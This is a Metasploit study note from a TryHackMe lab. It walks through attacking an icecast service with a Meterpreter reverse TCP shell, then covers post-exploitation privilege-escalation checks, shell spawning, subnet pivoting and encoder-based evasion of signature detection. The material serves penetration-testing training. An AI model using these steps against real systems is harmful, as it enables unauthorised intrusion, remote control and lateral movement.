# Metasploit

Pentesting framework, collection of thorougly tested exploits but also auxiliary and post-exploitation tools.

1. Initialize database, ``msfdb init``.
2. View advanced options, ``msfconsole -h``, use ``-q`` to start without banner.
3. Check if we have connnected to database, ``db_status``.

### Common Commands

* ``help`` or ``?``
* ``search <whatever>`` to search
* ``use`` to activate the module we want to leverage
* ``info`` to view information about either specific module or the active one
* ``connect`` to quick connect host to verify that we can 'talk', it's like a built in netcat-like function
* ``set`` to change value of variable, ``setg`` for global variable. ``getg``, ``get``, ``unset``, ``unsetg``.
* ``spool`` to set our console output to save to a file, it's very important to screen record and output logs when pentesting.
* ``db_save`` to store settings/active datastores from Metasploit to a settings file, it will save within msf4 directory.

## Modules

Metasploit consists of 6 core modules.

![image](https://user-images.githubusercontent.com/80155116/112130922-d7fc8680-8c2d-11eb-8ce1-9165f8374973.png)

**Post** is not included here but is used for looting and pivoting after exploitation.

**Payload** has the shellcodes.

**Encoder** is used in payload obfuscation, allowing us to modify the appearance of our exploit to avoid signature detection.

**NOP** is used with buffer overflow and ROP attacks.

We use ``load`` to load modules.

## Time to move the shell

``hosts, services, vulns`` to see currently discovered hosts, services, and vulnerabilities.

``use`` followed by string found within target exploit, ``use icecast``.

``search multi/handler`` and ``use NUMBER_NEXT_TO exploit/multi/handler``

![image](https://user-images.githubusercontent.com/80155116/112135986-455ee600-8c33-11eb-9512-d53ccfe652d9.png)

alternatively, we can use ``use NUMBER_NEXT_TO``.

Now we'll ``set PAYLOAD windows/meterpreter/reverse_tcp`` to modifiy which payloads we want to use.

``set LHOST YOUR_IP_ON_TRYHACKME``. ``ip addr`` to find IP, likely tun0.

``set RHOSTS 10.10.219.175`` to tell Metasploit which target to attack.

``use icecast`` again. Finally, ``run -j`` to run this as a job or ``exploit`` to run exploit.

We can check which job is up by ``jobs``. ``sessions`` for sessions, ``sessions -i SESSION_NUMBER`` to interact with target session.

![image](https://user-images.githubusercontent.com/80155116/112137036-a20ed080-8c34-11eb-837f-6248534e1cbe.png)

## Post

``ps`` to list the processes.

``run post/windows/gather/checkvm`` to determine if we are in a VM, will be helpful for further pivoting.

``run post/multi/recon/local_exploit_suggester`` to check various exploits we can run within session to escalate privileges.
![image](https://user-images.githubusercontent.com/80155116/112138049-e9499100-8c35-11eb-98ed-9b12b87fa970.png)

finally we can use ``shell`` to spawn a normal system shell.

``run autoroute -s 172.18.1.0/24 -n 255.255.255.0`` to add a route to the subnet 172.18.1.0/24.




